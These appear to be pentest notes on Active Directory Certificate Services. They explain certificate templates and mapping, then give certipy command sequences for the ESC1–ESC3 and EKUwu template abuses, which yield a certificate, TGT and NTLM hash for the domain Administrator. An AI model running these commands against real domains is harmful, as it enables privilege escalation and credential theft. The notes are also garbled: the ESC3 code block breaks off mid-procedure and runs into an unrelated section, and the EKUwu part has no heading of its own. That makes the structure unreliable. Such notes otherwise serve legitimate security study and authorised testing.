## Certificates
An **X.509 certificate** is a digitally signed document used for encryption, message signing, and authentication. It binds an identity (the **Subject**) to a **key pair**, letting applications use that key pair as proof of the user's identity.

|Field|Description|
|---|---|
|**Subject**|The certificate owner's identity.|
|**Public Key**|Links the Subject to a separate private key.|
|**NotBefore / NotAfter**|Start and end dates defining validity.|
|**Serial Number**|Unique identifier assigned by the issuing CA.|
|**Issuer**|Who issued the certificate (usually a CA).|
|**SubjectAlternativeName**|Alternative identities tied to the Subject.|
|**Basic Constraints**|Whether it's a CA or end entity, plus usage limits.|
|**Extended Key Usages (EKUs)**|Permitted uses (code signing, secure email, client/server auth, smart card logon, etc.).|
|**Signature Algorithm / Signature**|Algorithm used to sign, and the signature made with the issuer's private key.|
## Certificate Authorities
`Certificate Authorities (CAs)` serve as pivotal entities responsible for the issuance of certificates.

The root CA certificate is created by the CA itself through the signing of a new certificate using its private key (it is self-signed.)

ADCS stores trusted root CA certificates in four locations under the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC=`.
	`Certification Authorities container`: 
		Defines top-tier root CA certs.
	`Enrollment Services container`: 
		Hosts AD objects for each Enterprise CA.
	`NTAuthCertificates AD Object`: 
		Hosts CA certs pivotal for authenticating to AD.
	`AIA (Authority Information Access) container`: 
		Hosts AD Objects representing intermediate and cross CAs.
## Certificate Templates
AD CS Enterprise `CAs` use `certificate templates` to establish certificate settings. These templates are stored as AD objects with objectClass `pKICertificateTemplate`

The `pKIExtendedKeyUsage` attribute within an AD certificate template object contains a cluster of enabled `OIDs (Object Identifier)` that impact the permissible uses of the certificate. These EKU `OIDs` encompass functionalities such as Encrypting File System, Code Signing, Smart Card Logon, and Client Authentication, etc.

These OIDs have been shown to enable authentication to AD when present in a cert.

|Description|OID|
|---|---|
|Client Authentication|1.3.6.1.5.5.7.3.2|
|PKINIT Client Authentication*|1.3.6.1.5.2.3.4|
|Smart Card Logon|1.3.6.1.4.1.311.20.2.2|
|Any Purpose|2.5.29.37.0|
|SubCA|(no EKUs)|
## Enrollment Process
The steps a client follows to obtain a certificate from an Enterprise CA:

1. **Find an Enterprise CA** — Locate a CA via objects in the Enrollment Services container.
2. **Generate keys + CSR** — Create a public-private key pair and a CSR containing the public key, template name, and subject.
3. **Sign + submit CSR** — Sign the CSR with the private key and send it to the CA.
4. **CA authorization check** — CA verifies the client is authorized, then checks the template's permissions to decide whether to issue.
5. **CA issues certificate** — If permitted, the CA builds the certificate from the template (EKUs, crypto settings, etc.), signs it with its private key, and returns it.
6. **Client receives certificate** — Stored in the Windows Certificate Store and usable per the EKU OIDs it contains.
## Issuance Requirements
Two issuance requirement settings govern enrollment. They're found in the **Issuance Requirements** tab of a template's properties  
	`certsrv.msc` > Certificate Templates > Manage

**CA certificate manager approval** : 
	Sets the `CT_FLAG_PEND_ALL_REQUESTS (0x2)` bit in the template's `msPKI-EnrollmentFlag`. All requests go to a pending state (visible under "Pending Requests" in `certsrv.msc`) and require a certificate manager to approve or deny before issuance.

**Authorized signatures + Application policy** : 
	_This number of authorized signatures_ sets how many signatures the CSR must carry for the CA to accept it.
	_Application policy_ defines which EKU OIDs the signing certificate must have.
# ADCS Enumeration
In CTFs, it is common for the ADCS server to be installed on the DC. Real-world, it is often times on an independent server.

# Abusing Certificate Templates
## ESC1
If a certificate template allows including a `subjectAltName` (SAN) different from the user making the certificate request (CSR), it would allow us to request a certificate as any user in the domain.

Abuse Requirements:
	1. Enterprise CA grants enrollment rights to low-privileged users..
	2. Manager approval should be turned off (or social engineer to bypass).
	3. No authorized signatures are required.
	4. Security descriptor of cert template must be excessively permissive.
	5. The certificate template defines EKUs that enable authentication.
	6. The certificate template allows requestors to specify `subjectAltName` in the `CSR`.

## ESC2
A variation of ESC1. A certificate template defines the `Any Purpose` EKU (or no EKU at all), so the issued certificate can be used for anything: client auth, server auth, code signing, etc. If the template also allows the requestor to specify a `subjectAltName` (SAN), it is abused identically to ESC1.

If the requestor CANNOT specify a SAN, the template can still be abused as an enrollment agent to request a cert on behalf of another user, or (with no EKU / SubCA template) as a subordinate CA cert to sign new certs with arbitrary EKUs. 

>Note: SubCA-signed certs won't work for domain auth unless the SubCA is trusted by `NTAuthCertificates` (not the default).

Abuse Requirements:
1. Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (or social engineer to bypass).
3. No authorized signatures are required.
4. Security descriptor of cert template must be excessively permissive.
5. The certificate template defines `Any Purpose` EKU or has no EKU specified.

> **NOTES:** When the SAN-specifiable variant is present, the abuse command is identical to ESC1, so `certipy`/`Certify` won't distinguish the two. Confirm which primitive you're using from the `find` output.

## ESC3
Abuses a template with the `Certificate Request Agent` EKU (OID `1.3.6.1.4.1.311.20.2.1`). This EKU lets the holder request certs on behalf of other users. Two-step: (1) enroll in the vulnerable template to get an enrollment agent cert, (2) use that cert to request an auth-capable cert (e.g. built-in `User`) on behalf of a privileged account. Result is a cert as that account, used like ESC1/2 to get a TGT / NT hash.

Requires two template conditions on the CA:
- Cond 1: low-priv enrollment, no manager approval, no auth signatures, permissive DACL, and the `Certificate Request Agent` EKU.
- Cond 2: low-priv enrollment, no manager approval, an EKU allowing domain auth, and no enrollment-agent restrictions at the CA level.

Abuse Requirements:
1. Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (or social engineer to bypass).
3. No authorized signatures are required.
4. Security descriptor of cert template must be excessively permissive.
5. Template 1 has the `Certificate Request Agent` EKU; a second auth-capable template (e.g. `User`) is enrollable with no CA-level enrollment-agent restrictions.

>**NOTES:** The on-behalf-of template must allow Client Authentication (`User` works). Confirm no enrollment agent restrictions on the CA or step 2 fails.

Linux POC
```bash
# Enumerate
certipy find -u '<USER>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
	# ESC3 in [!] : "template has Certificate Request Agent EKU set"

# Step 1: request enrollment agent cert from the vulnerable template
certipy req -u '<USER>' -p '<PASS>' -target <CA_HOST> -ca '<CA>' -template '<ESC3_TEMPLATE>'
	# outputs <user>.pfx (the enrollment agent cert)

# Step 2: request cert on behalf of admin using the agent cert

## Certificate Mapping
Certificate mapping = how AD figures out which account an issued cert belongs to. When a user authenticates with a cert, the mapping is what ties that cert back to their account and not someone else's. Important for ESC6, ESC9, and ESC10.
### Why it exists
Microsoft added a security extension in response to CVE-2022-26923 (Certifried, found by Oliver Lyak). Before this, certs didn't carry a hard link to the account's SID, which is what those attacks abuse.

Three things to know:
- **`szOID_NTDS_CA_SECURITY_EXT`** : a cert extension that embeds the requester's `objectSid` (unique per AD object). This is the strong link.
- **`StrongCertificateBindingEnforcement`** : registry key controlling Kerberos mapping strictness.
- **`CertificateMappingMethods`** : registry key controlling Schannel mapping.

Since April 2023, "Disabled" mode is ignored. Only Compatibility and Full Enforcement count.

Two ways a cert maps to an account:
- **Explicit** : the account's `altSecurityIdentities` attribute holds the cert's identifier. Cert must be signed by a trusted CA and match that value. Strong.
- **Implicit** : the cert's SAN (UPN or DNS field) is matched against the account. Weaker, and where the abuse lives.
### Kerberos mapping (`StrongCertificateBindingEnforcement`)
| Value | Mode | Behavior |
|---|---|---|
| **0** | Disabled | SID extension not checked. Pre-patch behavior. Maps purely on UPN/SAN. |
| **1** | Compatibility (default) | Checks explicit mapping first. Falls back to SID extension; if absent, allows only if the account predates the cert. |
| **2** | Full Enforcement | Checks explicit mapping, then SID extension. No extension = auth refused. |

Why value 0 matters for abuse: with a UPN cert, the KDC tries to match `userPrincipalName`, then falls back to `sAMAccountName`, then retries with a `$` appended, so a UPN cert can map to a machine account. With a DNS cert, it splits `user.domain.local` into user + domain, validates the domain, then matches the user part with a `$` appended. This loose fallback is the what ESC9/10 abuse.

At values 1 or 2, the SID extension does the mapping via `objectSid`. At 1 with no extension present, it degrades to value-0 behavior.
### Schannel mapping (`CertificateMappingMethods`)
Bitmask, combine values:
- `0x0001` : Subject/issuer explicit
- `0x0002` : Issuer explicit
- `0x0004` : SAN implicit
- `0x0008` : S4USelf implicit Kerberos
- `0x0010` : S4USelf explicit Kerberos

Default is `0x18` (`0x8` + `0x10`). Schannel can't read the SID extension directly, but it "converts" its mapping to Kerberos via S4USelf, then maps as above. If cert auth breaks, Microsoft's official fix is to set this back to the old `0x1f`, which re-enables the weak implicit methods (and the attack surface).

Also known as "EKUwu" (research by Justin Bollinger, TrustedSec) and tracked as CVE-2024-49019. Affects unpatched CAs and lets an attacker inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. Because the injected policy can be Client Authentication or Certificate Request Agent, a template that never intended to allow auth becomes an ESC1 or ESC3 primitive.

Abuse Requirements:
1. `Enrollee Supplies Subject` is True.
2. Schema Version is 1.
3. CA not patched for CVE-2024-49019.

>**NOTES:** `-application-policies` is native in Certipy v5. Method 1 injects Client Auth for a direct ESC1-style impersonation. If that fails (e.g. the resulting cert can't PKINIT), fall back to Method 2, which injects the enrollment agent policy and pivots on-behalf-of like ESC3.

Method 1 - If this fails, try method 2
```bash
# Inject Client Auth policy and specify SAN
certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target_hostname> -ca <ca_name> -template <template_name> -upn administrator@<domain> -application-policies 'Client Authentication'
	# outputs administrator.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
	# Should return TGT administrator.ccache AND the NTLM hash
```

Method 2
```bash
# Inject enrollment agent policy on cert for compromised user
certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target_hostname> -ca <ca_name> -template <template_name> -upn <user>@<domain> -application-policies 'Certificate Request Agent'
	# outputs <user>.pfx (the enrollment agent cert)

# Use it to request a cert on behalf of admin from an auth template
certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target_hostname> -ca <ca_name> -template User -pfx <user>.pfx -on-behalf-of '<domain>\Administrator'
	# outputs administrator.pfx

# Auth as administrator
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
	# Should return TGT administrator.ccache AND the NTLM hash
